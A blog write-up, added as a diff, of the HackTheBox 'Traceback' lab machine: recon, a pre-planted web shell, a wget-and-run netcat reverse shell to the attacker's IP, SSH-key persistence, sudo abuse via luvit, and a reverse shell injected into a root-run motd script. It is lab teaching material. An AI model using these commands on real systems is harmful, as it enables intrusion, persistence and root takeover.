@@ -1,0 +1,261 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="This Box is currently in hackthbox active category , You can access the writeup only if you have the root flag of the machine.I cant reveal the box information due to hackthebox rules.Thanks" /><meta property="og:title" content="Hackthebox Traceback writeup" /><meta property="og:description" content="This Box is currently in hackthbox active category , You can access the writeup only if you have the root flag of the machine.I cant reveal the box information due to hackthebox rules.Thanks" /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/traceback/traceback.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Traceback writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="This Box is currently in hackthbox active category , You can access the writeup only if you have the root flag of the machine.I cant reveal the box information due to hackthebox rules.Thanks"><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/traceback/traceback.png"><title>Hackthebox Traceback writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Traceback writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Traceback writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Mar 15, 2020, 12:00 AM +0800" > Mar 15 <i class="unloaded">2020-03-15T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/traceback/traceback.png" class="post-preview-img"><h1 id="information">Information</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Traceback<tr><td>Points<td>20<tr><td>Difficulty<td>easy<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/21439">Xh4H</a><tr><td>Out On<td>14 march 2020<tr><td>creator’s Twitter<td><a href="https://twitter.com/RiftWhiteHat">@RiftWhiteHat</a></table></div><h1 id="summary">Summary</h1><ul><li>Finding the web shell uploaded by Creator<li>Getting a actual bash shell wih nc as webadmin<li>Running the luvit script with privesc.lau<li>Adding the public ssh key to authorized_keys<li><code class="language-plaintext highlighter-rouge">Getting user flag</code><li>running pspy to get the running process<li>Abusing the script running as root<li><code class="language-plaintext highlighter-rouge">Getting root flag</code></ul><h1 id="got-root">Got root</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/videos/traceback.cast" autoplay="1" start-at="00:22" speed="5" loop="1" cols="150" rows="20"></asciinema-player> ... <script src="/asciinema-player.js"></script><h1 id="recon">Recon</h1><h2 id="nmap">Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+</pre><td class="rouge-code"><pre>➜  prashant git:<span class="o">(</span>master<span class="o">)</span> ✗ nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-T4</span> <span class="nt">-p-</span> traceback.htb 
+Nmap scan report <span class="k">for </span>traceback.htb <span class="o">(</span>10.10.10.181<span class="o">)</span>z
+Host is up <span class="o">(</span>0.29s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65513 closed ports
+PORT      STATE    SERVICE        VERSION
+22/tcp    open     ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open     http           Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Help us
+3330/tcp  filtered mcs-calypsoicf
+5018/tcp  filtered unknown
+5238/tcp  filtered unknown
+9069/tcp  filtered unknown
+10820/tcp filtered unknown
+12908/tcp filtered unknown
+17068/tcp filtered unknown
+18106/tcp filtered unknown
+20168/tcp filtered unknown
+22631/tcp filtered unknown
+24199/tcp filtered unknown
+27286/tcp filtered unknown
+27473/tcp filtered unknown
+28023/tcp filtered unknown
+46715/tcp filtered unknown
+47592/tcp filtered unknown
+48033/tcp filtered unknown
+50766/tcp filtered unknown
+59029/tcp filtered unknown
+62037/tcp filtered unknown
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>1803.62 seconds
+</pre></table></code></div></div><p>After seeing that port 80 is opened i opened it on my browser. And got the following webpage</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/traceback/image-1.png" alt="webpage" /></p><p>This was looking like someone just changed the webpage after owning it.But no this was cretaor himself</p><p>I ran <code class="language-plaintext highlighter-rouge">gobuster</code> and <code class="language-plaintext highlighter-rouge">dirb</code> But it doesnt give me anything Interesting.</p><p>After viewing-source of the page there is a commented line at the bottom of the webpage</p><h2 id="identifying--the-web-shell">Identifying the web shell</h2><p><code class="language-plaintext highlighter-rouge">Some of the best web shells that you might need</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/traceback/image-2.png" alt="view-source" /></p><p>I thought maybe the user want us to use some web-shells</p><p>But after googling the same line i got a github repo at the top.Really interesting</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/traceback/image-3.png" alt="googling the line" /></p><p><a href="https://github.com/TheBinitGhimire/Web-Shells">https://github.com/TheBinitGhimire/Web-Shells</a></p><p>This repo includes some very cool web shells.And most interesting thing the creator of the box already forked the repo, So it is confirmed that we have to use these web shells somewhere</p><p>So the creator wants us to use these web shells But i didnt find any upload page or something from where i can use the webshell</p><p>Then i just tried to copy paste the name of the shell to check if the creator already uploaded it on the box.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/traceback/iamge-3.png" alt="Tried guessing" /></p><h1 id="getting-a-shell-as-webadmin">Getting a shell as webadmin</h1><p>After copying pasting many shell names, I got success on the smevk.php</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/traceback/image-4.png" alt="smvek.php" /></p><p>Tried Creds <code class="language-plaintext highlighter-rouge">admin:admin</code> and i m in.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/traceback/image-5.png" alt="shell" /></p><p>There is an execute command option in the web shell so i just want a bash/sh shell now.</p><p>I hosted the python http server</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>➜  Tools git:<span class="o">(</span>master<span class="o">)</span> ✗ python <span class="nt">-m</span> http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
+</pre></table></code></div></div><p>And execute the following command that will download the netcat from my server and giving it execute permission and executing it to get reverse shell as webadmin</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">wget http://10.10.14.194:8080/nc /tmp/nc;</span><span class="nb">chmod</span> +x /tmp/nc<span class="p">;</span>/tmp/nc <span class="nt">-e</span> /bin/bash 10.10.14.194 1234
+</pre></table></code></div></div><p>And i got the shell finally</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>➜  prashant git:<span class="o">(</span>master<span class="o">)</span> ✗ nc <span class="nt">-nlvp</span> 1234
+listening on <span class="o">[</span>any] 1234 ...
+connect to <span class="o">[</span>10.10.14.194] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.181] 49004
+<span class="nb">whoami
+</span>webadmin
+</pre></table></code></div></div><p>And After looking further i decided to get a proper ssh shell as the port 22 was opened I copied my id_rsa.pub to the <code class="language-plaintext highlighter-rouge">/home/webadmin/.ssh/authorized_keys</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDh/ub/0EON2VMcbDR9d9SnqU8cGsad08Ecr/Wbd2cfB+/08vCs6HIjdz2bSz+96QKODz6qP2irEOn8uAPIalCq0oB028LL4H/hZBQag8/UluQRrc2sfdImt5wm/cAN/KNPORWfVYxMOlBsIf5UTs7lMCoi43FRCpuZhGcu8CmWvHPJ1PMd/z0Cpnibq330u7vxBzm5mvm/5HWNst5BZ5NNTIEjWtoz4jj0fyFLyzVfJS4q7AQ9q4L4MndxEcG2rfnQyrko50NqwWiUpM7WpyT9QfyuEV5cYmgdbYugt2sdvOeJRqeIw/qyRFQs4XxJnz6Cxolm9ju4llNb2/ug6fsdK/cZauxSYh7Ddu06sTZoKexeMKVj/saHah76uwkdvT+sTXVYv9uwOdTC8KcwlmdmMAg3NUXWltaMNjryqon+g/81Ky2ugCCpG+jJB5SJxupwLJ1hhhujP5RCLk3Ebo9pL0twJhBdbxPLjMunEgMUKPN4u59gNMxOetAYYpcb9Bc= prashant@parrot"</span> <span class="o">&gt;&gt;</span> authorized_keys
+</pre></table></code></div></div><p>And login via my id_rsa as webadmin</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre> ➜  prashant git:<span class="o">(</span>master<span class="o">)</span> ✗ ssh <span class="nt">-i</span> .ssh/id_rsa webadmin@10.10.10.181
+<span class="c">#################################</span>
+<span class="nt">--------</span> OWNED BY XH4H  <span class="nt">---------</span>
+- I guess stuff could have been configured better ^^ -
+<span class="c">#################################</span>
+
+Welcome to Xh4H land 
+
+
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Thu Feb 27 06:29:02 2020 from 10.10.14.3
+webadmin@traceback:~<span class="nv">$ </span>
+</pre></table></code></div></div><h1 id="privilege-escalation-to-sysadmin">Privilege escalation to sysadmin</h1><p>And running a simple command <code class="language-plaintext highlighter-rouge">sudo -l</code> gave the hint to get the user flag</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>webadmin@traceback:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>webadmin on traceback:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User webadmin may run the following commands on traceback:
+    <span class="o">(</span>sysadmin<span class="o">)</span> NOPASSWD: /home/webadmin/luvit
+</pre></table></code></div></div><p>So i can run the script luvit as sysadmin. The Dir has also some file like <code class="language-plaintext highlighter-rouge">note.txt</code> and <code class="language-plaintext highlighter-rouge">privesc.lua</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>webadmin@traceback:~<span class="nv">$ </span><span class="nb">cat </span>note.txt 
+- sysadmin -
+I have left this tool to practice Lua. Contact me <span class="k">if </span>you have any question.
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>webadmin@traceback:~<span class="nv">$ </span><span class="nb">cat </span>privesc.lua 
+<span class="nb">local test</span> <span class="o">=</span> io.open<span class="o">(</span><span class="s2">"/home/sysadmin/.ssh/authorized_keys"</span>, <span class="s2">"a"</span><span class="o">)</span>
+<span class="nb">test</span>:write<span class="o">(</span><span class="s2">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDp3ANscyE/wYAJhH6FTHE7rbj+AlZs3ziQTrjojQ913UUFd5FHSfI83ed8efWrFCZB0RJKRQvFbsVu1ts2YuCM+Ziekn9uXarA47YHo7gfXpq0Ttb1jliooh8zcCd7ooFMjoRFnkBwKmGG/nknIQJQlEtyyEoCeBPpBLA/g7AHCuztZ38JWQUoJHBI1X8zm3IjPsDnrfcX6DqYGpEYmPY0isUQsCVOM7RXZVSZTyoJy9X7Iw/j8s1eiShvgs9o2N6HL7bNt8xDeRnM99k2uf5m5TaQ5peex/3SceUnqXkeueqq4VqE7QJZPMlPuMezh2bauqh0fNVyBIUFtFrrtGZF6+xkYiE443Ci/uGWqOvYhF4NgbfsWIwgIh/r6XziOWqDuoJpgU5f4s1IYJTMYoKdRkSELMukUmOJGuFEuaeZfzwniz9+1Y+SEOCOeGe2gTWnr9m9OzCozGrAGDEvF2kVGgcby+6/9ZFN5PQqAZkhNmIulYmlN52ecybeJTsVsKE= root@parrot</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
+<span class="nb">test</span>:close<span class="o">()</span>
+</pre></table></code></div></div><p>So basically lua is a programming language (Found it on google) And the privesc.lua a lua file which is opening the <code class="language-plaintext highlighter-rouge">authorized_keys</code> writing the <code class="language-plaintext highlighter-rouge">id_rsa.pub(public keys)</code> to it.</p><p>I found that this is a hint from the creator. So,We have to run the luvit as sysadmin and pass the privesc.lua as argument</p><p>I added my <code class="language-plaintext highlighter-rouge">id_rsa.pub</code> to the privesc.lua and run the luvit script with the following (Used <code class="language-plaintext highlighter-rouge">nano</code> to edit the file)</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>webadmin@traceback:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> sysadmin /home/webadmin/luvit privesc.lua
+</pre></table></code></div></div><p>And logged in as <code class="language-plaintext highlighter-rouge">sysadmin</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre>➜  prashant git:<span class="o">(</span>master<span class="o">)</span> ✗ ssh <span class="nt">-i</span> .ssh/id_rsa sysadmin@10.10.10.181
+<span class="c">#################################</span>
+<span class="nt">--------</span> OWNED BY XH4H  <span class="nt">---------</span>
+- I guess stuff could have been configured better ^^ -
+<span class="c">#################################</span>
+
+Welcome to Xh4H land 
+
+
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Sun Mar 15 00:25:36 2020 from 10.10.14.162
+<span class="nv">$ </span>
+</pre></table></code></div></div><h2 id="usertxt">User.txt</h2><p>Grabbed the <code class="language-plaintext highlighter-rouge">user flag</code> after spawning a <code class="language-plaintext highlighter-rouge">bash interactive shell</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>bash <span class="nt">-i</span>
+sysadmin@traceback:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+c2--------------------------6020
+</pre></table></code></div></div><h1 id="privilege-escalation-to-root">Privilege Escalation to Root</h1><p>After 5 minutes i decided to run <code class="language-plaintext highlighter-rouge">pspy64</code> to check which process are running as root And found an intereting one</p><div class="language-terminal highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt;</span><span class="w"> </span>/run/motd.dynamic.new
+</pre></table></code></div></div><p>And a script <code class="language-plaintext highlighter-rouge">91-release-upgrade</code> running as root when there is a login from <code class="language-plaintext highlighter-rouge">ssh</code></p><p>i looked in the dir <code class="language-plaintext highlighter-rouge">/etc/update-motd.d</code> and found the script <code class="language-plaintext highlighter-rouge">91-release-upgrade</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>sysadmin@traceback:/etc/update-motd.d<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 32
+drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 <span class="nb">.</span>
+drwxr-xr-x 80 root root     4096 Aug 25  2019 ..
+<span class="nt">-rwxrwxr-x</span>  1 root sysadmin  981 Mar 15 00:38 00-header
+<span class="nt">-rwxrwxr-x</span>  1 root sysadmin  982 Mar 15 00:38 10-help-text
+<span class="nt">-rwxrwxr-x</span>  1 root sysadmin 4264 Mar 15 00:38 50-motd-news
+<span class="nt">-rwxrwxr-x</span>  1 root sysadmin  604 Mar 15 00:38 80-esm
+<span class="nt">-rwxrwxr-x</span>  1 root sysadmin  299 Mar 15 00:38 91-release-upgrade
+sysadmin@traceback:/etc/update-motd.d<span class="err">$</span>
+</pre></table></code></div></div><p>We have read and write permission to the file So, We can easily edit the file by including a reverse shell in it and logging in from ssh, So the script can executed and we will get a reverse shell as root</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>sysadmin@traceback:/etc/update-motd.d<span class="nv">$ </span><span class="nb">cat </span>91-release-upgrade 
+<span class="c">#!/bin/sh</span>
+
+<span class="c"># if the current release is under development there won't be a new one</span>
+<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="si">$(</span>lsb_release <span class="nt">-sd</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f4</span><span class="si">)</span><span class="s2">"</span> <span class="o">=</span> <span class="s2">"(development"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">exit </span>0
+<span class="k">fi
+if</span> <span class="o">[</span> <span class="nt">-x</span> /usr/lib/ubuntu-release-upgrader/release-upgrade-motd <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">exec</span> /usr/lib/ubuntu-release-upgrader/release-upgrade-motd
+<span class="k">fi</span>
+</pre></table></code></div></div><p>There is an if condition if it false the program is exited to be true(0) So, i need to add reverse shell code before it</p><p>I added the nc reverse shell at the top of the script so the rev shell code can execute first</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>
+/tmp/nc <span class="nt">-e</span> /bin/bash 10.10.14.194 2345
+<span class="c"># if the current release is under development there won't be a new one</span>
+<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="si">$(</span>lsb_release <span class="nt">-sd</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f4</span><span class="si">)</span><span class="s2">"</span> <span class="o">=</span> <span class="s2">"(development"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">exit </span>0
+<span class="k">fi
+if</span> <span class="o">[</span> <span class="nt">-x</span> /usr/lib/ubuntu-release-upgrader/release-upgrade-motd <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">exec</span> /usr/lib/ubuntu-release-upgrader/release-upgrade-motd
+<span class="k">fi</span>
+</pre></table></code></div></div><p>And started my listner on port 2345</p><p>As soon as i login from ssh as sysadmin i got root shell</p><h2 id="roottxt">Root.txt</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>➜  prashant git:<span class="o">(</span>master<span class="o">)</span> ✗ nc <span class="nt">-nlvp</span> 2345
+listening on <span class="o">[</span>any] 2345 ...
+connect to <span class="o">[</span>10.10.14.194] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.181] 49042
+<span class="nb">whoami
+</span>root
+<span class="nb">hostname
+</span>traceback
+<span class="nb">cat</span> /root/root.txt
+ccda-----------------------585d6
+</pre></table></code></div></div><p>And we got root</p><p>Thanks for reading, a single feedback will be appreciated !!!</p><blockquote><p>If you want to get notified as soon as i upload something new to my <code class="language-plaintext highlighter-rouge">blog</code> So just click on the bell icon you are seeing on the right side – &gt; and allow push <code class="language-plaintext highlighter-rouge">notification</code></p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/webshell/" class="post-tag no-text-decoration" >webshell</a> <a href="/tags/lua-programming-language/" class="post-tag no-text-decoration" >lua programming language</a> <a href="/tags/file-write/" class="post-tag no-text-decoration" >file write</a> <a href="/tags/shell-scripting/" class="post-tag no-text-decoration" >shell scripting</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a 